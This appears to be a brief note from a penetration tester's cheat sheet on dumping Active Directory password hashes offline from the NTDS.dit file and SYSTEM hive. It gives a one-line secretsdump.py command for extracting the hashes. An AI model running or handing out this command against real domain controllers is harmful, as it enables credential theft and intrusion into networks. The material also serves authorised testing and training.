#creds 

dumping NTDS.dit offline, we will need `NTDS.dit` and `SYSTEM` files. 
`NTDS.dit` has all the hashes and encrypted using `SYSTEM` so we need both

> Local hashes only
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM local
```
